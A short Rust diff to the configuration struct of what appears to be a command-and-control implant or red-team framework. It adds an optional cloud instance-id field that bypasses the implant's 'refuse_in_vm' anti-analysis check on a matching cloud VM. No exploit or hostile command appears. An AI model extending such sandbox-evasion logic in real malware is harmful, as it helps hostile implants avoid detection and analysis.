@@ -115,6 +115,11 @@ pub struct MalleableProfile {
     /// will refuse to connect after this date.  Leave empty to disable.
     #[serde(default)]
     pub kill_date: String,
+    /// Optional cloud instance identifier allowlist entry.  When set and the
+    /// host IMDS instance-id matches this value, `refuse_in_vm` enforcement is
+    /// bypassed for this trusted cloud VM.
+    #[serde(default)]
+    pub cloud_instance_id: Option<String>,
     /// SSH relay hostname for the `ssh-transport` feature.
     #[serde(default)]
     pub ssh_host: Option<String>,
@@ -174,6 +179,7 @@ impl Default for MalleableProfile {
             doh_server_url: None,
             cdn_endpoint: String::new(),
             kill_date: String::new(),
+            cloud_instance_id: None,
             ssh_host: None,
             ssh_port: None,
             ssh_username: None,
